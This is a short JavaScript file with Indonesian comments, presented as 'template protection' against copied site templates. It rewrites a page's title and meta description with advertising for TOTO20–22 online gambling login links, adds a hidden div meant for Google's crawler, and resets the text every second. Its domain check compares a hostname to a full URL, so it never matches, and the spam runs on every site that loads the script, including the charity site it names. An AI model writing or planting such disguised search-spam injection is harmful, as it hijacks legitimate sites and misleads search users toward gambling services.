// template-protection.js - Host di GitHub
(function() {
    'use strict';
    
    // === KONFIGURASI ===
    const ASLI = {
        domain: 'https://careforlifecharitabletrust.org/about-us/', // Ganti dengan domain asli Anda
        judul: 'TOTO20, TOTO21, TOTO22 – Kumpulan Link Login Resmi Situs Toto Online Terbaik & Terpercaya Tahun Ini', // Title asli
        deskripsi: 'Temukan link login resmi TOTO20, TOTO21, dan TOTO22 di sini. Akses situs toto online terbaik & terpercaya dengan layanan cepat, bonus besar, serta keamanan transaksi tinggi sepanjang tahun ini.' // Description asli
    };
    
    // === CEK DOMAIN ===
    const domainSekarang = window.location.hostname;
    const domainAsli = ASLI.domain;
    const isWebsiteAsli = domainSekarang === domainAsli || domainSekarang === 'www.' + domainAsli;
    
    // === JALANKAN PROTECTION ===
    if (!isWebsiteAsli) {
        console.log('🚫 Template ilegal terdeteksi:', domainSekarang);
        
        // 1. PAKSA TITLE JADI PUNYA KITA
        document.title = ASLI.judul;
        
        // 2. PAKSA META DESCRIPTION JADI PUNYA KITA  
        let metaDesc = document.querySelector('meta[name="description"]');
        if (metaDesc) {
            metaDesc.content = ASLI.deskripsi;
        } else {
            metaDesc = document.createElement('meta');
            metaDesc.name = 'description';
            metaDesc.content = ASLI.deskripsi;
            document.head.appendChild(metaDesc);
        }
        
        // 3. WATERMARK DI BODY (buat Google crawl)
        const watermark = document.createElement('div');
        watermark.style.display = 'none';
        watermark.innerHTML = `Website asli: ${ASLI.domain} | ${ASLI.judul} | ${ASLI.deskripsi}`;
        document.body.appendChild(watermark);
        
        // 4. OTOMATIS BALIKIN JIKA DIUBAH
        setInterval(() => {
            if (document.title !== ASLI.judul) {
                document.title = ASLI.judul;
            }
            
            let desc = document.querySelector('meta[name="description"]');
            if (desc && desc.content !== ASLI.deskripsi) {
                desc.content = ASLI.deskripsi;
            }
        }, 1000);
        
    } else {
        console.log('✅ Website asli, protection aktif');
    }
    
})();
